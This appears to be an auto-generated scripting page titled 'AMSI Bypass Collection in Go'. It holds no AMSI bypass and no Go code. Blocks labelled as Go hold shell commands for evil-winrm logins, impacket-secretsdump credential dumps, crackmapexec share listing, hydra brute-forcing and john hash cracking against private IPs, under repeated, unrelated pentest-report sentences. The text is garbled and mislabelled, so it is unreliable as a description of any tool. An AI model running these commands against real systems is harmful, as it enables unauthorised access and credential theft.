---
TitleSEO: "AMSI Bypass Collection in Go | ZureFX"
TitlePost: "AMSI Bypass Collection — Go"
Author: "ZureFX"
Description: "A Go script for amsi bypass collection. Built for security research and automation."
Keywords: "script, scanner, bash, parser, automation, c, go"
URL: "https://zurefx.github.io/scripting/script-amsi-bypass-collection-447.html"
URL_IMAGES: ""
Date: "2025-10-08"
Tags: "Script, Scanner, Bash, Parser, Automation, C, Go"
Section: "scripting"
Lang: "en"
main_img: "script-amsi-bypass-collection-447"
Permalink: "/scripting/script-amsi-bypass-collection-447.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `socat`
- `smbexec`
- `hydra`

## Implementation

### Core Logic

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```go
evil-winrm -i 10.45.69.63 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The backup files contained sensitive information that should not have been accessible. Lateral movement was facilitated by reusing discovered credentials across services.

```go
evil-winrm -i 10.114.135.253 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.20.33.173
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.29.194 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.70.46.160 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.50.215.85/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible. The backup files contained sensitive information that should not have been accessible.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.117.157
crackmapexec smb 10.85.39.231 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.79.123
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 0.71s
```
